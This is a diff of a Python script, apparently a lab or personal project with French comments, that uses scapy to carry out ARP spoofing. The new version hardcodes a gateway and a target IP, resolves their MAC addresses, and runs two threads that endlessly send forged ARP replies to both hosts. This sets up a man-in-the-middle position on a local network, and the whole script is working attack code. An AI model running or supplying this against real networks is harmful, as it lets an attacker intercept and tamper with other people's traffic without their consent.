@@ -1,75 +1,48 @@
 #! /usr/bin/python3
-import logging
-import time
-import random
+import threading
 
-from args import argument
-from scapy.config import conf
+from scapy.arch import get_if_addr
 from scapy.arch import get_if_hwaddr
 from scapy.layers.inet import Ether
 from scapy.layers.l2 import ARP
-from scapy.sendrecv import sendp, srp
-from scapy.packet import Padding
+from scapy.sendrecv import sendp
+from scapy.sendrecv import srp
+
+IFACE = 'ens5'
+
+MY_MAC = get_if_hwaddr(IFACE)  # NOTE recupere mon MAC de l'interface
+MY_IP = get_if_addr(IFACE)
+
+GATEWAY = '192.168.0.1'
+TARGET = '192.168.0.2'
 
 
-MY_MAC = get_if_hwaddr(conf.iface)  # NOTE recupere mon MAC de l'interface
+def get_mac(target: str) -> str:
+    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target)
 
-
-def get_mac(gateway: str = None, target: str = None):
-    """Function that returns the mac address of the given ip address.
-
-    Args:
-        gateway (str, optional): gateway ip. Defaults to None.
-        target (str, optional): target ip. Defaults to None.
-
-    Returns:
-        str: mac to ip.
-    """
-
-    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gateway)
-
-    if target:
-        pkt['ARP'].pdst = target
-
-    resp, _ = srp(pkt, timeout=0.05, verbose=False, retry=10)
+    resp, _ = srp(pkt, verbose=False, iface=IFACE)
     for _, r in resp:
         return r.hwsrc
 
 
-def poising(target_mac: str, ip_target: str, gateway_ip: str = '192.168.0.1', loop: int = 10, sleep_: float = 0.005):
-    """Function target arp table poisoning
-
-    Args:
-        target_mac (str): target mac for poising arp table
-        gateway_ip (str, optional): ip gateway. Defaults to '192.168.0.1'.
-        loop (int, optional): number send packet . Defaults to 10.
-        sleep (int, optional): time to sleep between each request. Defaults to 1.51.
-    """
-
-    pkt = Ether(dst=target_mac) / ARP(psrc=gateway_ip,
-                                      hwsrc=MY_MAC, op='is-at', pdst=ip_target, hwdst=target_mac)
-    pkt.show()
-    for _ in range(loop): 
-        pkt_ = pkt / Padding(load='x'* random.randint(42, 65))
-        sendp(pkt_, verbose=False)
+def poising_target(hw_target: str)-> None:
+    pkt = Ether(dst=hw_target) / ARP(pdst=TARGET, hwdst=hw_target,
+                                     hwsrc=MY_MAC, psrc=GATEWAY,
+                                     op='is-at')
+    sendp(pkt, verbose=0, iface=IFACE, loop=1)
 
 
-if __name__ == '__main__':
+def poising_gateway(hw_gateway: str)-> None:
+    pkt = Ether(dst=hw_gateway) / ARP(pdst=GATEWAY, hwdst=hw_gateway,
+                                    psrc=TARGET, hwsrc=MY_MAC,
+                                    op='is-at')
+    
+    sendp(pkt, verbose=0, loop=1, iface=IFACE)
 
-    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-    arg = argument()
-    ip_target = arg.target
-    ip_gateway = arg.gateway
+mac_target = get_mac(TARGET)
+mac_gateway = get_mac(GATEWAY)
 
-    mac_addr_gateway = get_mac(ip_gateway)
-    mac_addr_target = get_mac(target=ip_target)
-
-    print(f'Adresse mac target: {mac_addr_target}')
-    print(f'Adresse mac gateway: {mac_addr_gateway}')
-
-    try:
-        poising(mac_addr_target, ip_target, gateway_ip=ip_gateway, loop=1000000)
-    except KeyboardInterrupt:
-        import sys 
-        sys.exit()
+threading.Thread(target=poising_target, args=(mac_target, )).start()
+threading.Thread(target=poising_gateway, args=(mac_gateway, )).start()
+    
